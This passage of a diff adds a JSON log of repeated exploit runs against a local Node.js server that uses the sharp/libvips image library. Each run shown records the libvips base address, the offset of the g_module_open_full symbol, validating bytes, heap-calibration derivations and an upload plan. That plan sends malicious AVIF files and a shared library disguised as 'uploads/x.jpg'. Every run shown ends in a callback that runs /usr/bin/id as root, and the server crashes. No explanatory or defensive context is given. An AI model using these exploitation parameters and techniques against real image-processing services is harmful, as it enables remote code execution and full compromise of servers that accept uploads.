+          {
+            "offset": "0x1be1b0",
+            "value": "0x7fa602fac1b0",
+            "repetitions": 2,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d60",
+              "0x1aa50"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7fa602fb1120",
+            "repetitions": 4,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d58",
+              "0xae08",
+              "0xc068",
+              "0x1aa48"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7fa602fb1130",
+            "repetitions": 4,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d68",
+              "0xae18",
+              "0xc078",
+              "0x1aa58"
+            ]
+          },
+          {
+            "offset": "0x1de9c0",
+            "value": "0x7fa602fcc9c0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xde48"
+            ]
+          }
+        ],
+        "rejected_candidates": [
+          "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+        ],
+        "attempts": [
+          {
+            "attempt": 1,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 2,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 3,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 4,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 5,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 6,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 7,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 8,
+            "status": "selected",
+            "supported_pair_count": 1,
+            "selected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+            "selected_base": "0x7fa602dee000",
+            "rejected_candidates": [
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          }
+        ]
+      },
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-7ab117322e2e44ffbaaeb53bc3e56a21.avif",
+      "upload_contract": {
+        "calibration_donors": {
+          "count": 8,
+          "filename_suffix": ".avif",
+          "content_type": "image/avif"
+        },
+        "callback_library": {
+          "filename": "x.jpg",
+          "remote_path": "uploads/x.jpg",
+          "content_type": "image/jpeg"
+        },
+        "payload": {
+          "filename": "exploit-7ab117322e2e44ffbaaeb53bc3e56a21.avif",
+          "content_type": "image/avif"
+        }
+      },
+      "node_profile": {
+        "elf_type": "ET_DYN",
+        "build_id": "339440d6f33368ed4fb57f3c214d62163e2201c4",
+        "sha256": "ca0728526aa1cc4e3056decec848ecc6d2c5391cecdd4e21a0ebd221d665c84e"
+      },
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 4,
+      "exploit_exit": 0,
+      "server_exit": 139
+    },
+    {
+      "target": "http://127.0.0.1:3216",
+      "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=0(root) gid=0(root) groups=0(root)",
+        "valid": true
+      },
+      "libvips_base": "0x7f95115eb000",
+      "control_target": {
+        "module": "libvips",
+        "module_base": "0x7f95115eb000",
+        "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "symbol": "g_module_open_full",
+        "exported": false,
+        "offset": "0x3e995e",
+        "address": "0x7f95119d495e",
+        "derivation": "0x7f95115eb000 + 0x3e995e = 0x7f95119d495e",
+        "abi": "path_rdi_flags_esi_error_rdx",
+        "validating_bytes": "4157415641554989fd31ff415455534883ec48897424144889542418e8b1fdff",
+        "remote_anchor_evidence": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f95117a91b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d60"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f95117ae120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d58",
+              "0xae08",
+              "0xc068"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f95117ae130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d68",
+              "0xae18",
+              "0xc078"
+            ]
+          },
+          {
+            "offset": "0x1de9c0",
+            "value": "0x7f95117c99c0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xde48"
+            ]
+          }
+        ]
+      },
+      "heap_calibration": {
+        "derived_selector": "0x5c60",
+        "selector_source": "profile_page_lane",
+        "profile_candidate_selector": "0x5c60",
+        "profile_selector_evidence": {
+          "anchor_page_low16": "0x6000",
+          "fake_node_delta_from_anchor_page": "-0x3a0",
+          "derivation": "(0x6000 + -0x3a0) & 0xffff = 0x5c60"
+        },
+        "record_candidate_selectors": [],
+        "minimum_observations": 1,
+        "observations": [
+          {
+            "status": "candidates",
+            "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7f95115eb000",
+            "record_variant": "pie_tail",
+            "selector_strategy": "profile_page_lane",
+            "selector_source": "profile_page_lane",
+            "profile_candidate_selector": "0x5c60",
+            "profile_selector_evidence": {
+              "anchor_page_low16": "0x6000",
+              "fake_node_delta_from_anchor_page": "-0x3a0",
+              "derivation": "(0x6000 + -0x3a0) & 0xffff = 0x5c60"
+            },
+            "record_candidate_selectors": [],
+            "response_sha256": "45a880d5faf777865d891a68eccaaba0f5d92948bbbe88bf142eac3a81ea2e68",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 0,
+            "selected_anchor_rank": null,
+            "matches": [],
+            "candidate_selectors": [
+              "0x5c60"
+            ],
+            "attempt": 5,
+            "classification_status": "selected"
+          }
+        ]
+      },
+      "classification": {
+        "selected_attempt": 5,
+        "selected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+        "selected_base": "0x7f95115eb000",
+        "selected_anchors": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f95117a91b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d60"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f95117ae120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d58",
+              "0xae08",
+              "0xc068"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f95117ae130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d68",
+              "0xae18",
+              "0xc078"
+            ]
+          },
+          {
+            "offset": "0x1de9c0",
+            "value": "0x7f95117c99c0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xde48"
+            ]
+          }
+        ],
+        "rejected_candidates": [
+          "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+        ],
+        "attempts": [
+          {
+            "attempt": 1,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 2,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 3,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 4,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 5,
+            "status": "selected",
+            "supported_pair_count": 1,
+            "selected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+            "selected_base": "0x7f95115eb000",
+            "rejected_candidates": [
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          }
+        ]
+      },
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-d17d6be430c446d2ad4a82da6adf9b9b.avif",
+      "upload_contract": {
+        "calibration_donors": {
+          "count": 5,
+          "filename_suffix": ".avif",
+          "content_type": "image/avif"
+        },
+        "callback_library": {
+          "filename": "x.jpg",
+          "remote_path": "uploads/x.jpg",
+          "content_type": "image/jpeg"
+        },
+        "payload": {
+          "filename": "exploit-d17d6be430c446d2ad4a82da6adf9b9b.avif",
+          "content_type": "image/avif"
+        }
+      },
+      "node_profile": {
+        "elf_type": "ET_DYN",
+        "build_id": "339440d6f33368ed4fb57f3c214d62163e2201c4",
+        "sha256": "ca0728526aa1cc4e3056decec848ecc6d2c5391cecdd4e21a0ebd221d665c84e"
+      },
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 5,
+      "exploit_exit": 0,
+      "server_exit": 139
+    },
+    {
+      "target": "http://127.0.0.1:3216",
+      "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=0(root) gid=0(root) groups=0(root)",
+        "valid": true
+      },
+      "libvips_base": "0x7f166edee000",
+      "control_target": {
+        "module": "libvips",
+        "module_base": "0x7f166edee000",
+        "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "symbol": "g_module_open_full",
+        "exported": false,
+        "offset": "0x3e995e",
+        "address": "0x7f166f1d795e",
+        "derivation": "0x7f166edee000 + 0x3e995e = 0x7f166f1d795e",
+        "abi": "path_rdi_flags_esi_error_rdx",
+        "validating_bytes": "4157415641554989fd31ff415455534883ec48897424144889542418e8b1fdff",
+        "remote_anchor_evidence": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f166efac1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d60"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f166efb1120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d58",
+              "0xae08",
+              "0xc068"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f166efb1130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d68",
+              "0xae18",
+              "0xc078"
+            ]
+          },
+          {
+            "offset": "0x1de9c0",
+            "value": "0x7f166efcc9c0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xde48"
+            ]
+          }
+        ]
+      },
+      "heap_calibration": {
+        "derived_selector": "0x5c60",
+        "selector_source": "profile_page_lane",
+        "profile_candidate_selector": "0x5c60",
+        "profile_selector_evidence": {
+          "anchor_page_low16": "0x6000",
+          "fake_node_delta_from_anchor_page": "-0x3a0",
+          "derivation": "(0x6000 + -0x3a0) & 0xffff = 0x5c60"
+        },
+        "record_candidate_selectors": [],
+        "minimum_observations": 1,
+        "observations": [
+          {
+            "status": "candidates",
+            "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7f166edee000",
+            "record_variant": "pie_tail",
+            "selector_strategy": "profile_page_lane",
+            "selector_source": "profile_page_lane",
+            "profile_candidate_selector": "0x5c60",
+            "profile_selector_evidence": {
+              "anchor_page_low16": "0x6000",
+              "fake_node_delta_from_anchor_page": "-0x3a0",
+              "derivation": "(0x6000 + -0x3a0) & 0xffff = 0x5c60"
+            },
+            "record_candidate_selectors": [],
+            "response_sha256": "047c2a8db181dacde94f5a84203410065b4b46ff21847d2edbeb6ee22813d233",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 0,
+            "selected_anchor_rank": null,
+            "matches": [],
+            "candidate_selectors": [
+              "0x5c60"
+            ],
+            "attempt": 5,
+            "classification_status": "selected"
+          }
+        ]
+      },
+      "classification": {
+        "selected_attempt": 5,
+        "selected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+        "selected_base": "0x7f166edee000",
+        "selected_anchors": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f166efac1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d60"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f166efb1120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d58",
+              "0xae08",
+              "0xc068"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f166efb1130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d68",
+              "0xae18",
+              "0xc078"
+            ]
+          },
+          {
+            "offset": "0x1de9c0",
+            "value": "0x7f166efcc9c0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xde48"
+            ]
+          }
+        ],
+        "rejected_candidates": [
+          "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+        ],
+        "attempts": [
+          {
+            "attempt": 1,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 2,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 3,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 4,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 5,
+            "status": "selected",
+            "supported_pair_count": 1,
+            "selected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+            "selected_base": "0x7f166edee000",
+            "rejected_candidates": [
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          }
+        ]
+      },
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-2abd1575bf9e4e84a6d5b3003141e173.avif",
+      "upload_contract": {
+        "calibration_donors": {
+          "count": 5,
+          "filename_suffix": ".avif",
+          "content_type": "image/avif"
+        },
+        "callback_library": {
+          "filename": "x.jpg",
+          "remote_path": "uploads/x.jpg",
+          "content_type": "image/jpeg"
+        },
+        "payload": {
+          "filename": "exploit-2abd1575bf9e4e84a6d5b3003141e173.avif",
+          "content_type": "image/avif"
+        }
+      },
+      "node_profile": {
+        "elf_type": "ET_DYN",
+        "build_id": "339440d6f33368ed4fb57f3c214d62163e2201c4",
+        "sha256": "ca0728526aa1cc4e3056decec848ecc6d2c5391cecdd4e21a0ebd221d665c84e"
+      },
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 6,
+      "exploit_exit": 0,
+      "server_exit": 139
+    },
+    {
+      "target": "http://127.0.0.1:3216",
+      "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=0(root) gid=0(root) groups=0(root)",
+        "valid": true
+      },
+      "libvips_base": "0x7f5382dee000",
+      "control_target": {
+        "module": "libvips",
+        "module_base": "0x7f5382dee000",
+        "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "symbol": "g_module_open_full",
+        "exported": false,
+        "offset": "0x3e995e",
+        "address": "0x7f53831d795e",
+        "derivation": "0x7f5382dee000 + 0x3e995e = 0x7f53831d795e",
+        "abi": "path_rdi_flags_esi_error_rdx",
+        "validating_bytes": "4157415641554989fd31ff415455534883ec48897424144889542418e8b1fdff",
+        "remote_anchor_evidence": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f5382fac1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d60"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f5382fb1120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d58",
+              "0xae08",
+              "0xc068"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f5382fb1130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d68",
+              "0xae18",
+              "0xc078"
+            ]
+          },
+          {
+            "offset": "0x1de9c0",
+            "value": "0x7f5382fcc9c0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xde48"
+            ]
+          }
+        ]
+      },
+      "heap_calibration": {
+        "derived_selector": "0x5c60",
+        "selector_source": "profile_page_lane",
+        "profile_candidate_selector": "0x5c60",
+        "profile_selector_evidence": {
+          "anchor_page_low16": "0x6000",
+          "fake_node_delta_from_anchor_page": "-0x3a0",
+          "derivation": "(0x6000 + -0x3a0) & 0xffff = 0x5c60"
+        },
+        "record_candidate_selectors": [],
+        "minimum_observations": 1,
+        "observations": [
+          {
+            "status": "candidates",
+            "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7f5382dee000",
+            "record_variant": "pie_tail",
+            "selector_strategy": "profile_page_lane",
+            "selector_source": "profile_page_lane",
+            "profile_candidate_selector": "0x5c60",
+            "profile_selector_evidence": {
+              "anchor_page_low16": "0x6000",
+              "fake_node_delta_from_anchor_page": "-0x3a0",
+              "derivation": "(0x6000 + -0x3a0) & 0xffff = 0x5c60"
+            },
+            "record_candidate_selectors": [],
+            "response_sha256": "c08c3b7390da5b4496f017c5b660afb6e8fc33dc3581853ef789000c87385781",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 0,
+            "selected_anchor_rank": null,
+            "matches": [],
+            "candidate_selectors": [
+              "0x5c60"
+            ],
+            "attempt": 3,
+            "classification_status": "selected"
+          }
+        ]
+      },
+      "classification": {
+        "selected_attempt": 3,
+        "selected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+        "selected_base": "0x7f5382dee000",
+        "selected_anchors": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f5382fac1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d60"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f5382fb1120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d58",
+              "0xae08",
+              "0xc068"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f5382fb1130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d68",
+              "0xae18",
+              "0xc078"
+            ]
+          },
+          {
+            "offset": "0x1de9c0",
+            "value": "0x7f5382fcc9c0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xde48"
+            ]
+          }
+        ],
+        "rejected_candidates": [
+          "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+        ],
+        "attempts": [
+          {
+            "attempt": 1,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 2,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 3,
+            "status": "selected",
+            "supported_pair_count": 1,
+            "selected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+            "selected_base": "0x7f5382dee000",
+            "rejected_candidates": [
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          }
+        ]
+      },
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-fa2db7d4d80d49f49a7431d5e3a85e4d.avif",
+      "upload_contract": {
+        "calibration_donors": {
+          "count": 3,
+          "filename_suffix": ".avif",
+          "content_type": "image/avif"
+        },
+        "callback_library": {
+          "filename": "x.jpg",
+          "remote_path": "uploads/x.jpg",
+          "content_type": "image/jpeg"
+        },
+        "payload": {
+          "filename": "exploit-fa2db7d4d80d49f49a7431d5e3a85e4d.avif",
+          "content_type": "image/avif"
+        }
+      },
+      "node_profile": {
+        "elf_type": "ET_DYN",
+        "build_id": "339440d6f33368ed4fb57f3c214d62163e2201c4",
+        "sha256": "ca0728526aa1cc4e3056decec848ecc6d2c5391cecdd4e21a0ebd221d665c84e"
+      },
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 7,
+      "exploit_exit": 0,
+      "server_exit": 139
+    },
+    {
+      "target": "http://127.0.0.1:3216",
+      "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=0(root) gid=0(root) groups=0(root)",
+        "valid": true
+      },
+      "libvips_base": "0x7fb1805e9000",
+      "control_target": {
+        "module": "libvips",
+        "module_base": "0x7fb1805e9000",
+        "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "symbol": "g_module_open_full",
+        "exported": false,
+        "offset": "0x3e995e",
+        "address": "0x7fb1809d295e",
+        "derivation": "0x7fb1805e9000 + 0x3e995e = 0x7fb1809d295e",
+        "abi": "path_rdi_flags_esi_error_rdx",
+        "validating_bytes": "4157415641554989fd31ff415455534883ec48897424144889542418e8b1fdff",
+        "remote_anchor_evidence": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7fb1807a71b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d60"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7fb1807ac120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d58",
+              "0xae08",
+              "0xc068"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7fb1807ac130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d68",
+              "0xae18",
+              "0xc078"
+            ]
+          },
+          {
+            "offset": "0x1de9c0",
+            "value": "0x7fb1807c79c0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xde48"
+            ]
+          }
+        ]
+      },
+      "heap_calibration": {
+        "derived_selector": "0x5c60",
+        "selector_source": "profile_page_lane",
+        "profile_candidate_selector": "0x5c60",
+        "profile_selector_evidence": {
+          "anchor_page_low16": "0x6000",
+          "fake_node_delta_from_anchor_page": "-0x3a0",
+          "derivation": "(0x6000 + -0x3a0) & 0xffff = 0x5c60"
+        },
+        "record_candidate_selectors": [],
+        "minimum_observations": 1,
+        "observations": [
+          {
+            "status": "candidates",
+            "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7fb1805e9000",
+            "record_variant": "pie_tail",
+            "selector_strategy": "profile_page_lane",
+            "selector_source": "profile_page_lane",
+            "profile_candidate_selector": "0x5c60",
+            "profile_selector_evidence": {
+              "anchor_page_low16": "0x6000",
+              "fake_node_delta_from_anchor_page": "-0x3a0",
+              "derivation": "(0x6000 + -0x3a0) & 0xffff = 0x5c60"
+            },
+            "record_candidate_selectors": [],
+            "response_sha256": "d4d699f618ad2bb6b2a5bd9e2432c6ca4bab41c3e1a29e329ba66cf1c56deb2e",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 0,
+            "selected_anchor_rank": null,
+            "matches": [],
+            "candidate_selectors": [
+              "0x5c60"
+            ],
+            "attempt": 3,
+            "classification_status": "selected"
+          }
+        ]
+      },
+      "classification": {
+        "selected_attempt": 3,
+        "selected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+        "selected_base": "0x7fb1805e9000",
+        "selected_anchors": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7fb1807a71b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d60"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7fb1807ac120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d58",
+              "0xae08",
+              "0xc068"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7fb1807ac130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d68",
+              "0xae18",
+              "0xc078"
+            ]
+          },
+          {
+            "offset": "0x1de9c0",
+            "value": "0x7fb1807c79c0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xde48"
+            ]
+          }
+        ],
+        "rejected_candidates": [
+          "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+        ],
+        "attempts": [
+          {
+            "attempt": 1,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 2,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 3,
+            "status": "selected",
+            "supported_pair_count": 1,
+            "selected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+            "selected_base": "0x7fb1805e9000",
+            "rejected_candidates": [
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          }
+        ]
+      },
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-329a12fda96c418d83d32e4015b7c85d.avif",
+      "upload_contract": {
+        "calibration_donors": {
+          "count": 3,
+          "filename_suffix": ".avif",
+          "content_type": "image/avif"
+        },
+        "callback_library": {
+          "filename": "x.jpg",
+          "remote_path": "uploads/x.jpg",
+          "content_type": "image/jpeg"
+        },
+        "payload": {
+          "filename": "exploit-329a12fda96c418d83d32e4015b7c85d.avif",
+          "content_type": "image/avif"
+        }
+      },
+      "node_profile": {
+        "elf_type": "ET_DYN",
+        "build_id": "339440d6f33368ed4fb57f3c214d62163e2201c4",
+        "sha256": "ca0728526aa1cc4e3056decec848ecc6d2c5391cecdd4e21a0ebd221d665c84e"
+      },
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 8,
+      "exploit_exit": 0,
+      "server_exit": 139
+    },
+    {
